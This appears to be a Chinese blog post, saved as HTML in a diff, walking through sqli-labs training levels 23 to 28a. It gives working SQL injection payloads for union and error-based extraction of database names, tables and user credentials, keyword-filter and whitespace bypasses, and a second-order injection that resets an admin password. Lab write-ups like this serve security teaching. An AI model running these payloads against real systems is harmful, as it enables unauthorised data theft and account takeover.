@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="zh-hans">
+
+<head>
+    
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<meta name="HandheldFriendly" content="True" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/apple-touch-icon.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon-32x32.png" />
+<link rel="icon" type="image/png" sizes="16x16" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon-16x16.png" />
+<link rel="manifest" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/site.webmanifest" />
+<link rel="mask-icon" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/safari-pinned-tab.svg" color="#8aa2d3" />
+<link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon.ico" />
+<meta name="theme-color" content="#ffffff" />
+
+
+<title>Sqli-labs-less 22-28a - Phoenix-Pl’s Blog</title>
+
+
+<meta name="author" content="DSRKafuU" />
+
+
+<meta name="description" content="A minimal Hugo theme with nice theme color." />
+
+
+<meta name="keywords" content="Sqli-labs" />
+
+
+<meta property="og:title" content="Sqli-labs-less 22-28a" />
+<meta name="twitter:title" content="Sqli-labs-less 22-28a" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://Phoenix-Pl.github.io/post/sqli-labs-less23-28a/" /><meta property="og:description" content="less-23 首先还是单引号尝试 http://localhost/sqli-labs-master/Less-23/?id=1&#39; 发现报错 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1 并且由 &#39;1&#39;&#39; LIMIT 0,1 可知是单引号闭合 但当我们用--&#43;或者%23注释时，还是报错 这时有些疑惑，看了一下源码 发现这里对 #" />
+<meta name="twitter:description" content="less-23 首先还是单引号尝试 http://localhost/sqli-labs-master/Less-23/?id=1&#39; 发现报错 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1 并且由 &#39;1&#39;&#39; LIMIT 0,1 可知是单引号闭合 但当我们用--&#43;或者%23注释时，还是报错 这时有些疑惑，看了一下源码 发现这里对 #" /><meta property="og:image" content="https://Phoenix-Pl.github.io/img/og.png" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://Phoenix-Pl.github.io/img/og.png" /><meta property="article:published_time" content="2020-05-11T00:00:00+00:00" /><meta property="article:modified_time" content="2020-05-11T00:00:00+00:00" />
+
+
+<style>
+    @media (prefers-color-scheme: dark) {
+        body[data-theme='auto'] img {
+            filter: brightness(60%);
+        }
+    }
+
+    body[data-theme='dark'] img {
+        filter: brightness(60%);
+    }
+</style>
+
+
+
+<link rel="stylesheet" href="https://Phoenix-Pl.github.io/assets/css/fuji.min.css" />
+
+
+
+
+
+</head>
+
+<body data-theme="auto">
+    <script data-cfasync="false">
+  
+  var fujiThemeData = localStorage.getItem('fuji_data-theme');
+  
+  if (!fujiThemeData) {
+    localStorage.setItem('fuji_data-theme', 'auto');
+  } else {
+    
+    if (fujiThemeData !== 'auto') {
+      document.body.setAttribute('data-theme', fujiThemeData === 'dark' ? 'dark' : 'light');
+    }
+  }
+</script>
+    <header>
+    <div class="container-lg clearfix">
+        <div class="col-12 header">
+            <a class="title-main" href="https://Phoenix-Pl.github.io/">Phoenix-Pl’s Blog</a>
+            
+            <span class="title-sub">书山有路勤为径，学海无涯苦作舟</span>
+            
+        </div>
+    </div>
+</header>
+
+    <main>
+        <div class="container-lg clearfix">
+            
+            <div class="col-12 col-md-9 float-left content">
+                
+<article>
+    
+    <h2 class="post-item post-title">
+        <a href="https://Phoenix-Pl.github.io/post/sqli-labs-less23-28a/">Sqli-labs-less 22-28a</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2020-05-11</span><span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;3674 字</span><span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/sqli-labs">Sqli-labs</a>&nbsp;</span>
+
+    </div>
+    
+    <div class="post-content markdown-body">
+        <h3 id="less-23">less-23</h3>
+<p>首先还是单引号尝试</p>
+<p><code>http://localhost/sqli-labs-master/Less-23/?id=1'</code></p>
+<p>发现报错</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201031164442754.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><code>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1</code></p>
+<p>并且由 <code>'1'' LIMIT 0,1</code> 可知是单引号闭合</p>
+<p>但当我们用<code>--+</code>或者<code>%23</code>注释时，还是报错</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201031164703423.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201031165119741.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这时有些疑惑，看了一下源码</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201031165303698.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>发现这里对 <code>#</code>   (空格) <code>--+</code> 做了过滤处理</p>
+<p>所以这里我们只能通过<code>and</code> 或者<code>or</code> 语句进行闭合</p>
+<p>然后这里还有一个新发现，就是一种特殊的注释符  ==<strong>;%00</strong>==</p>
+<p>那我们先用注释符的方法做一下这一关</p>
+<p><code>http://localhost/sqli-labs-master/Less-23/?id=1';%00</code></p>
+<p>成功惹~</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201031165922729.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>后面就和第一关一样了，简略写一下步骤吧</p>
+<ul>
+<li>判断列数</li>
+</ul>
+<p><code>http://localhost/sqli-labs-master/Less-23/?id=1' order by 3;%00</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201031170208466.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>这里说明有三列</p>
+<ul>
+<li>找回显</li>
+</ul>
+<p><code>http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,2,3 ;%00</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201031170502493.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>爆库</li>
+</ul>
+<p><code>http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata;%00</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201031170835666.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>爆表</li>
+</ul>
+<p><code>http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security';%00</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201031171055910.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>爆列名</li>
+</ul>
+<p><code>http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' ;%00</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020103119323496.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>爆信息</li>
+</ul>
+<p><code>http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users ;%00</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020103119452026.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>也可以尝试将单引号闭合</p>
+<p><code>http://localhost/sqli-labs-master/Less-23/?id=1' and '1'='1</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101120546623.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>但此时我们就不能用 order by 判断字段数了，但我们可以利用select一个一个试，当我们<code>select 1,2,3</code>的时候，页面不报错了，所以说有三个字段。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101120834945.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><code>http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,version(),3 and '1'='1</code>,其余查询和前面的操作基本类似。 但此时回显位置只有2和3，而且由于3位置先和后面的and做运算，所以始终为1或者0，所以只能在2处注入。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101120928774.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>因为在<code>select 1，2，3，4</code>的时候会报错，所以可以使用报错注入</p>
+<p><code>http://localhost/sqli-labs-master/Less-23/?id=-1' and extractvalue(1,concat(0x7e,user())) and '1'='1</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101121227504.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>后面只是换语句即可</p>
+<h3 id="less-24">less-24</h3>
+<p>此题考察二次注入</p>
+<p>这关和之前又不一样，是个完整的登录注册页面</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101124429978.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>我们看一眼代码</p>
+<pre><code class="language-sql">//login.php中的源码
+$username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);
+$password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);
+//mysql_real_escape_string() 函数,转义SQL语句中使用的字符串中的特殊字符。
+
+
+//pass_change.php中的源码
+$username= $_SESSION[&quot;username&quot;];
+        $curr_pass= mysql_real_escape_string($_POST['current_password']);
+        $pass= mysql_real_escape_string($_POST['password']);
+        $re_pass= mysql_real_escape_string($_POST['re_password']);
+
+        if($pass==$re_pass)
+        {
+                $sql = &quot;UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' &quot;;
+//这段代码的意思就是如果用户输入的两次新密码相同，就可以更改密码，这里就有注入点了，如果用户的用户名中带有注释，那么后面的代码就不会执行，就不用判断老密码了，所以我们就可以在知道用户名，不知道密码的情况下修改密码，前提是后台代码不会对用户名进行检查
+</code></pre>
+<p>在login_create.php中</p>
+<pre><code class="language-mysql">$username=  mysql_escape_string($_POST['username']) ;
+$pass= mysql_escape_string($_POST['password']);
+$re_pass= mysql_escape_string($_POST['re_password']);
+
+$sql = &quot;insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;
+</code></pre>
+<p>这里，前面是获取用户名和密码，后面是将用户名和密码插入到数据库中
+mysql_escape_string — 转义一个字符串用于 mysql_query</p>
+<pre><code class="language-php">例：aa'bb   ----&gt;    aa\'bb
+</code></pre>
+<p><strong>当数据写入到数据库的时候反斜杠会被移除，所以写入到数据库的内容就是原始数据，并不会在前面多了反斜杠。</strong></p>
+<pre><code class="language-mysql"> $username= $_SESSION[&quot;username&quot;];
+</code></pre>
+<p>所以在这里并没有对用户名的合法性作出检验，所有会有一个注入点：
+如果我们新建用户时，用户名里有注释符，那么我们在修改密码时，这个用户名就会将后面的内容注释，也就不需要旧密码</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101145257759.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>我们从命令行看一下没注册前的数据</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020110114562267.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>注册一个跟上图原有的username相似的username：</li>
+</ul>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101150333390.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>数据表中已存入刚注册的username和password：</li>
+</ul>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101150453581.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>
+<p>寻找另一处引用这个数据并没有被转义又插入进了数据库中。即：在登录后的密码修改处</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101154412139.png#pic_center" alt="在这里插入图片描述" />
+</p>
+</li>
+</ul>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101154516182.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>.</p>
+<ul>
+<li>Reset后admin的密码就会被更改：</li>
+</ul>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101155006232.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>原理</strong></p>
+<p>这就是二次注入，它的原理是：</p>
+<pre><code class="language-sql">（1）后端（PHP）代码对语句进行了转义
+
+（2）保存进数据库（mysql）时没有转义，是原语句
+123
+</code></pre>
+<p>简而言之就是数据库对自己存储的数据非常放心，而用户恰恰向数据库插入了恶意语句。</p>
+<p><strong>解析</strong></p>
+<p>比如前面所注册的<code>admin '#</code>账号，在注册时，后端对其进行了转义（ addslashes() 或者mysql_real_escape_string和mysql_escape_string 等），<code>'#</code>被转义成了其他的东西，所以一次注入无效。
+但是在保存进数据库的时候，还是<code>admin '#</code>。</p>
+<p>那么修改密码时的语句如下：</p>
+<pre><code class="language-sql">update users set  password='123' where username='admin '#'
+1
+</code></pre>
+<p>所以你以为修改的是<code>admin '#</code>的账号，但是数据库理解成要修改密码的账号是<code>admin</code>。</p>
+<h3 id="less-25">less-25</h3>
+<p>看题目提示<code>All Your'OR' and 'AND' belong to us</code></p>
+<p>猜测，<code>and</code> 和 <code>or</code> 被过滤掉了</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101204959260.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>尝试到<code>http://localhost/sqli-labs-master/Less-25/?id=1' order by 3 --+</code>,报错了，猜测是or被过滤了。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101212645971.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>大小写绕过不成功·。尝试双写，可以绕过<code>http://localhost/sqli-labs-master/Less-25/?id=1' oorrder by 3 --+</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101213054946.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>当然<code>order by</code> 的order由于含有特殊单词<code>or</code>被过滤，我们构造<code>oorrder by</code> 其他单词也是一样进行常规注入就可以了。</p>
+<p>可用联合查询，和报错注入</p>
+<h3 id="less-25a">less-25a</h3>
+<p>这一关关闭了报错，同样过滤了and和or</p>
+<p>猜一下。<code>http://localhost/sqli-labs-master/Less-25a/?id=1' --+</code>没反应….可能为数字型注入。</p>
+<p><code>http://localhost/Less-25a/?id=1 oorrder by 3</code>成功回显。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101214137611.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>其余步骤类似前面关卡。</p>
+<p>但，关闭了报错，所以不能用报错注入了</p>
+<h3 id="less-26">less-26</h3>
+<p>测试单引号，报错，根据报错提示<code>'1'' LIMIT 0,1</code>，推出字符型注入，单引号闭合。</p>
+<p>用<code>%23</code>或者<code>--+</code>闭合以下，发现还是报错，猜测可能过滤了注释符，可用<code>;%00</code>成功绕过。也可用<code>and '1'='1</code>拼接后边的单引号。</p>
+<p><code>http://localhost/sqli-labs-master/Less-26/?id=1' 1--+2--+3 --+</code>报错<code>123' LIMIT 0,1</code>验证了将注释过滤成了空。</p>
+<p>并且<code>http://localhost/sqli-labs-master/Less-26/?id=1' 1and2or3 --+</code>报错<code>123' LIMIT 0,1</code>推出and和or也被过滤，尝试双写，发现可以绕过</p>
+<p>看下源码，看下过滤了什么</p>
+<pre><code class="language-sql">function blacklist($id)
+{
+	$id= preg_replace('/or/i',&quot;&quot;, $id);			//strip out OR (non case sensitive)
+	$id= preg_replace('/and/i',&quot;&quot;, $id);		//Strip out AND (non case sensitive)
+	$id= preg_replace('/[\/\*]/',&quot;&quot;, $id);		//strip out /*
+	$id= preg_replace('/[--]/',&quot;&quot;, $id);		//Strip out --
+	$id= preg_replace('/[#]/',&quot;&quot;, $id);			//Strip out #
+	$id= preg_replace('/[\s]/',&quot;&quot;, $id);		//Strip out spaces
+	$id= preg_replace('/[\/\\\\]/',&quot;&quot;, $id);		//Strip out slashes
+	return $id;
+}
+</code></pre>
+<p>查看源代码，发现空格被过滤了，<code>/**/</code>能代替空格但也被过滤了。</p>
+<p>考虑空格：用以下几种url编码代替空格即可</p>
+<ul>
+<li>%09 Tab键（水平）</li>
+<li>%0a 新建一行</li>
+<li>%0c 新的一页</li>
+<li>%0d return 键</li>
+<li>%0b Tab键（垂直）</li>
+<li>%a0 空格</li>
+<li>() 绕过</li>
+</ul>
+<p>关于or 和 and 的绕过</p>
+<ul>
+<li>可用双写，即oorr 和 aandnd 绕过</li>
+<li>或者用||代替or 用&amp;&amp;代替and</li>
+</ul>
+<p><strong>注：在hackbar中输入&amp;&amp;时，需要自行URL编码为%26%26，否则会报错，而输入</strong></p>
+<p><strong>||不需要</strong></p>
+<p><code>http://localhost/sqli-labs-master/Less-26/?id=1' aandnd(updatexml(1,concat(0x7e,database(),0x7e),1));%00</code>,成功爆出数据库。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101220118820.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><code>http://localhost/sqli-labs-master/Less-26/?id=1'aandnd(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),0x7e),1));%00</code>爆出表名，其余操作类似。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020110122034473.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>上边空格绕过，只成功了<code>%a0</code>,其他都报错</p>
+<p><code>http://localhost/sqli-labs-master/Less-26/?id=1'aandnd%a01=1;%00</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101220757601.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><code>http://localhost/sqli-labs-master/Less-26/?id=111111'%a0union%a0select%a01,group_concat(username,passwoorrd),3%a0from%a0users;%00</code>由于-被过滤所以联合注入时，id参数不能用负数了，可以随便找个字符或者大一点的数字，让他查询为空从而显示后边的。</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201101220907466.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="less-26a">less-26a</h3>
+<p>本关关闭了报错。</p>
+<p><code>http://localhost/sqli-labs-master/Less-26a/?id=1') ;%00</code> 成功返回正确信息，说明闭合方式为<code>')</code></p>
+<p>其余操作和上关类似。<code>http://localhost/sqli-labs-master/Less-26a/?id=.')%a0union%a0select%a01,group_concat(username,passwoorrd),3%a0from%a0users;%00</code></p>
+<h3 id="less-27">less-27</h3>
+<pre><code class="language-sql">function blacklist($id)
+{
+$id= preg_replace('/[\/\*]/',&quot;&quot;, $id);		//strip out /*
+$id= preg_replace('/[--]/',&quot;&quot;, $id);		//Strip out --.
+$id= preg_replace('/[#]/',&quot;&quot;, $id);			//Strip out #.
+$id= preg_replace('/[ +]/',&quot;&quot;, $id);	//Strip out spaces.
+$id= preg_replace('/select/m',&quot;&quot;, $id);	//Strip out spaces.
+$id= preg_replace('/[ +]/',&quot;&quot;, $id);	//Strip out spaces.
+$id= preg_replace('/union/s',&quot;&quot;, $id);	//Strip out union
+$id= preg_replace('/select/s',&quot;&quot;, $id);	//Strip out select
+$id= preg_replace('/UNION/s',&quot;&quot;, $id);	//Strip out UNION
+$id= preg_replace('/SELECT/s',&quot;&quot;, $id);	//Strip out SELECT
+$id= preg_replace('/Union/s',&quot;&quot;, $id);	//Strip out Union
+$id= preg_replace('/Select/s',&quot;&quot;, $id);	//Strip out select
+return $id;
+}
+</code></pre>
+<p>本关过滤了<code>select union</code>等，但可以通过双写或者大小写绕过。</p>
+<p>很奇怪，商议关不能用的那些绕过空格的方法都可以用了……</p>
+<p>payload:<code>http://localhost/sqli-labs-master/Less-27?id=.'%a0UNiON%a0SeleCt%a01,group_concat(username,password),3%a0from%a0users;%00</code></p>
+<h3 id="less-27a">less-27a</h3>
+<p>测试单引号页面正常，双引号页面不正常。<code>http://192.168.2.222/-labs-master/Less-27a/?id=1&quot;</code>,猜测包裹参数的有双引号，注释掉后边，页面正常，<code>http://localhost/sqli-labs-master/Less-27a/?id=1&quot;;%00</code>,说明闭合方式为双引号<code>&quot;</code></p>
+<p>过滤规则和上关一样。</p>
+<p>payload: <code>http://localhost/sqli-labs-master/Less-27a/?id=1111&quot;%0auniunionon%0aSeleCt%0a1,group_concat(username,password),3%0afrom%0ausers;%00</code></p>
+<h3 id="less-28">less-28</h3>
+<p>测试单引号页面回显不正常，说明包裹参数的有但引号。<code>http://localhost/sqli-labs-master/Less-28?id=1' ;%00</code>截断后面的，页面还回显不正常，说明包裹参数的还有其他符号，在增加一个括号，回显正常<code>http://localhost/sqli-labs-master/Less-28?id=1') ;%00</code>,说明闭合方式为单引号括号<code>')</code>。</p>
+<pre><code class="language-sql">function blacklist($id)
+{
+$id= preg_replace('/[\/\*]/',&quot;&quot;, $id);				//strip out /*
+$id= preg_replace('/[--]/',&quot;&quot;, $id);				//Strip out --.
+$id= preg_replace('/[#]/',&quot;&quot;, $id);					//Strip out #.
+$id= preg_replace('/[ +]/',&quot;&quot;, $id);			//Strip out spaces.
+//$id= preg_replace('/select/m',&quot;&quot;, $id);	   		 	//Strip out spaces.
+$id= preg_replace('/[ +]/',&quot;&quot;, $id);			//Strip out spaces.
+$id= preg_replace('/union\s+select/i',&quot;&quot;, $id);	//Strip out UNION &amp; SELECT.
+return $id;
+}
+</code></pre>
+<p>直接利用前面的知识绕过即可。l</p>
+<p><code>http://localhost/sqli-labs-master/Less-28?id=.')%0aunionunion%0aselect%0aselect%0a1,group_concat(username,password),3%0afrom%0ausers;%00</code>成功绕过。</p>
+<h3 id="less-28a">less-28a</h3>
+<pre><code class="language-sql">function blacklist($id)
+{
+//$id= preg_replace('/[\/\*]/',&quot;&quot;, $id);				//strip out /*
+//$id= preg_replace('/[--]/',&quot;&quot;, $id);				//Strip out --.
+//$id= preg_replace('/[#]/',&quot;&quot;, $id);					//Strip out #.
+//$id= preg_replace('/[ +]/',&quot;&quot;, $id);			//Strip out spaces.
+//$id= preg_replace('/select/m',&quot;&quot;, $id);	   		 	//Strip out spaces.
+//$id= preg_replace('/[ +]/',&quot;&quot;, $id);			//Strip out spaces.
+$id= preg_replace('/union\s+select/i',&quot;&quot;, $id);	//Strip out spaces.
+return $id;
+}
+</code></pre>
+<p>仅仅过滤了<code>union select</code>,直接用<code>union union select select</code>绕过即可。</p>
+
+    </div>
+</article>
+
+
+<div class="license markdown-body">
+    <blockquote>
+        <p>除特殊注明部分，本站内容采用 <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"
+               target="_blank">CC BY-NC-SA 4.0</a> 进行许可。</p>
+    </blockquote>
+</div>
+
+
+
+            </div>
+            <aside class="col-12 col-md-3 float-left sidebar">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>页面</h3>
+        <ul>
+            
+            <li>
+                <a href="/">首页</a>
+            </li>
+            
+            <li>
+                <a href="/archives/">归档</a>
+            </li>
+            
+            <li>
+                <a href="/about/">关于</a>
+            </li>
+            
+            <li>
+                <a href="/search/">Search</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>链接</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/amzrk2" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+            <li>
+                <a href="https://twitter.com/amzrk2" target="_blank"><span>Twitter</span></a>
+            </li>
+            
+            <li>
+                <a href="https://space.bilibili.com/19767474" target="_blank"><span>bilibili</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>标签</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/css/">css</a>
+            </span>
+            
+            <span>
+                <a href="/tags/html/">html</a>
+            </span>
+            
+            <span>
+                <a href="/tags/markdown/">markdown</a>
+            </span>
+            
+            <span>
+                <a href="/tags/sqli-labs/">Sqli-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/themes/">themes</a>
+            </span>
+            
+            <span>
+                <a href="/tags/upload-labs/">Upload-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98/">奇奇怪怪的问题</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a>
+            </span>
+            
+        </div>
+    </div>
+    <div class="sidebar-item sidebar-toc">
+        <h3>目录</h3><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#less-23">less-23</a></li>
+        <li><a href="#less-24">less-24</a></li>
+        <li><a href="#less-25">less-25</a></li>
+        <li><a href="#less-25a">less-25a</a></li>
+        <li><a href="#less-26">less-26</a></li>
+        <li><a href="#less-26a">less-26a</a></li>
+        <li><a href="#less-27">less-27</a></li>
+        <li><a href="#less-27a">less-27a</a></li>
+        <li><a href="#less-28">less-28</a></li>
+        <li><a href="#less-28a">less-28a</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+</aside>
+        </div>
+        <div class="btn">
+    <div class="btn-menu" id="btn-menu">
+        <i class="iconfont icon-grid-sharp"></i>
+    </div>
+    <div class="btn-toggle-mode">
+        <i class="iconfont icon-contrast-sharp"></i>
+    </div>
+    <div class="btn-scroll-top">
+        <i class="iconfont icon-chevron-up-circle-sharp"></i>
+    </div>
+</div>
+<aside class="sidebar-mobile" style="display: none;">
+  <div class="sidebar-wrapper">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>页面</h3>
+        <ul>
+            
+            <li>
+                <a href="/">首页</a>
+            </li>
+            
+            <li>
+                <a href="/archives/">归档</a>
+            </li>
+            
+            <li>
+                <a href="/about/">关于</a>
+            </li>
+            
+            <li>
+                <a href="/search/">Search</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>链接</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/amzrk2" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+            <li>
+                <a href="https://twitter.com/amzrk2" target="_blank"><span>Twitter</span></a>
+            </li>
+            
+            <li>
+                <a href="https://space.bilibili.com/19767474" target="_blank"><span>bilibili</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>标签</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/css/">css</a>
+            </span>
+            
+            <span>
+                <a href="/tags/html/">html</a>
+            </span>
+            
+            <span>
+                <a href="/tags/markdown/">markdown</a>
+            </span>
+            
+            <span>
+                <a href="/tags/sqli-labs/">Sqli-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/themes/">themes</a>
+            </span>
+            
+            <span>
+                <a href="/tags/upload-labs/">Upload-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98/">奇奇怪怪的问题</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a>
+            </span>
+            
+        </div>
+    </div>
+    
+    
+    
+    <div class="sidebar-item sidebar-toc">
+        <h3>目录</h3>
+        <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#less-23">less-23</a></li>
+        <li><a href="#less-24">less-24</a></li>
+        <li><a href="#less-25">less-25</a></li>
+        <li><a href="#less-25a">less-25a</a></li>
+        <li><a href="#less-26">less-26</a></li>
+        <li><a href="#less-26a">less-26a</a></li>
+        <li><a href="#less-27">less-27</a></li>
+        <li><a href="#less-27a">less-27a</a></li>
+        <li><a href="#less-28">less-28</a></li>
+        <li><a href="#less-28a">less-28a</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+    
+  </div>
+</aside>
+    </main>
+
+    <footer>
+    <div class="container-lg clearfix">
+        <div class="col-12 footer">
+            
+            <span>&copy; 2020-2021
+                <a href="https://Phoenix-Pl.github.io/">DSRKafuU</a>
+                 | <a href="https://github.com/itsme/my_blog">Source code</a> 
+                | 基于 <a href="https://github.com/amzrk2/hugo-theme-fuji/"
+                   target="_blank">Fuji-v2</a> &amp; <a href="https://gohugo.io/"
+                                                    target="_blank">Hugo</a> 构建
+            </span>
+        </div>
+    </div>
+</footer>
+
+    
+<script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.0/lazysizes.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js"></script>
